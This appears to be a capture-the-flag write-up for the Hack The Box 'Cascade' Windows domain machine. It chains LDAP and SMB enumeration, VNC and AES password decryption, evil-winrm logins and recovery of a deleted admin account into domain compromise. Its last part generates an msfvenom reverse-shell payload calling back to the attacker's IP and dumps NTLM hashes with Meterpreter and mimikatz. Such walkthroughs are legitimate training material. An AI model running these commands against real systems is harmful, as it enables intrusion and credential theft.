Machine IP: 10.10.10.182

========================================

The foothold took me ages, the password is hidden away in the results of this LDAP query.  
```bash
$ ldapsearch -x -h 10.10.10.182 -s sub -b 'DC=cascade,DC=local'
```

Obtain password encoded in base64:
```bash
$ echo -n 'clk0bjVldmE=' | base64 -d
rY4n5eva
```

I enumerate the shares:
```bash
$ smbclient //10.10.10.182/Data -U 'r.thompson'
```
Finding 'Meeting_Notes_June_2018.html':
```html
<p>-- We will be using a temporary account to
perform all tasks related to the network migration and this account will be deleted at the end of
2018 once the migration is complete. This will allow us to identify actions
related to the migration in security logs etc. Username is TempAdmin (password is the same as the normal admin account password). </p>
```

I also find VNC Install.reg. I open it in windows because it didn't work properly in linux.
Find obfuscuted password inside:
"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f

Googling about this VNC application takes me here:
https://github.com/frizb/PasswordDecrypts

```bash
msf5 > irb
[*] Starting IRB shell...
[*] You are in the "framework" object


>> fixedkey = "\x17\x52\x6b\x06\x23\x4e\x58\x07"
>> "\u0017Rk\u0006#NX\a"
=> "\x17Rk\x06#NX\a"
>> require 'rex/proto/rfb'
=> true
>> Rex::Proto::RFB::Cipher.decrypt ["6bcf2a4b6e5aca0f"].pack('H*'), fixedkey
=> "sT333ve2"
```

The password for s.smith is sT333ve2, I login with WindowsRM but don't see much so I go back to the initial ports for enumeration - this time using steve's credentials.

I come across the audit share:

```bash
$ smbclient //10.10.10.182/Audit$ -U 's.smith'
```

I find a database file, Audit.db - looking through with SQLite I see a password:

uname: ArkSvc	

pwd: BQO5l5Kj9MdErXx6Q6AGOw== 

Using a .NET decompiler (dotpeek) to reverse engineer the binary, I found the symbol 'DecryptString' which decrypts the password. 

I also find the IV and Key:
```c#
  string EncryptedString = Conversions.ToString(sqLiteDataReader["Pwd"]);
    try {
        str = Crypto.DecryptString(EncryptedString, "c4scadek3y654321"); //IV
    }
```

So I used the DecryptString function to Decrypt the password found earlier:
```c#
using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace Decrypt
{
    class Dec
    {
        static void Main(string[] args)
        {
            string str = DecryptString("BQO5l5Kj9MdErXx6Q6AGOw==", "c4scadek3y654321");
            System.Console.WriteLine("DECRYPTED PASSWORD:");
	        System.Console.WriteLine(str);
        }

        static string DecryptString(string EncryptedString, string Key)
        {
            byte[] buffer = Convert.FromBase64String(EncryptedString);
            Aes aes = Aes.Create();
            aes.KeySize = 128;
            aes.BlockSize = 128;
            aes.IV = Encoding.UTF8.GetBytes("1tdyjCbY1Ix49842");
            aes.Mode = CipherMode.CBC;
            aes.Key = Encoding.UTF8.GetBytes(Key);
            using (MemoryStream memoryStream = new MemoryStream(buffer))
            {
                using (CryptoStream cryptoStream = new CryptoStream((Stream)memoryStream, aes.CreateDecryptor(), CryptoStreamMode.Read))
                {
                    byte[] numArray = new byte[checked(buffer.Length - 1 + 1)];
                    cryptoStream.Read(numArray, 0, numArray.Length);
                    return Encoding.UTF8.GetString(numArray);
                }
            }
        }
    }
}
```

I run it, which gives me the password:

```console
DECRYPTED PASSWORD:
w3lc0meFr31nd

Press any key to close this window . . .
```

Login with evil-winrm:

```powershell
$ evil-winrm -i 10.10.10.182 -u ArkSvc -p w3lc0meFr31nd
```
During usual enumeration, I see that ArkSvc is part of the recycle bin group:

```console
*Evil-WinRM* PS C:\> net user ArkSvc 
Local Group Memberships      *AD Recycle Bin
```

Google says its possible to recover objects from the bin, I also saw an old email in the 'Data' share saying TempAdmin and the Admin account have the same password. 

Running:
```powershell
*Evil-WinRM* PS C:\> Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
Returns this:
```powershell
CanonicalName                   : cascade.local/Deleted Objects/TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz
CN                              : TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
ObjectGUID                      : f0cc344d-31e0-4866-bceb-a842791ca059
objectSid                       : S-1-5-21-3332504370-1206983947-1165150453-1136
primaryGroupID                  : 513
...
```

The password is encoded in base64, decode the password:
```console
$ echo -n YmFDVDNyMWFOMDBkbGVz | base64 -d
baCT3r1aN00dles
```

Login to the admin account:
```powershell
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
31a8cd9bf4e4772c45f2bd5a96ae20ba
```

Done!

Also wanted to quickly grab the administators NTLM hash, it's easier if we have a meterpreter shell:

Generate payload:

```bash
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.148 LPORT=5959 -f exe -o shell.exe
```

Upload and execute with Evil-WinRM while listening on msf.

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Desktop> upload /cascade/shell.exe
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ./cascadeadmin.exe
```

Dump the hashes out of memory:
```bash
msf5 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.148:5959 
[*] Sending stage (176195 bytes) to 10.10.10.182
[*] Meterpreter session 1 opened (10.10.14.148:5959 -> 10.10.10.182:53327) at 2020-07-01 11:20:55 +1000

meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
meterpreter > ps

Process List
============

 PID    PPID    Name        Arch  Session       User                      Path
 ---    ----    ----        ----  -------       ----                      ----
 1384   520     dns.exe     x64      0          NT AUTHORITY\SYSTEM       C:\Windows\System32\dns.exe

meterpreter > migrate 1384
[*] Migrating from 2868 to 1384...
[*] Migration completed successfully.

meterpreter > load mimikatz 
Loading extension mimikatz...[!]
Success.
meterpreter > mimikatz_command -f samdump::hashes
Ordinateur : CASC-DC1.cascade.local
BootKey    : 3c67174689c6b5a53b5e3227e338e2ad

Rid  : 500
User : Administrator
LM   : 
NTLM : d256a4c6553e66da3c7872179eeb7d26
```

Done.

Thanks to VBScrub for this machine, it was one of the best i've done so far :) 
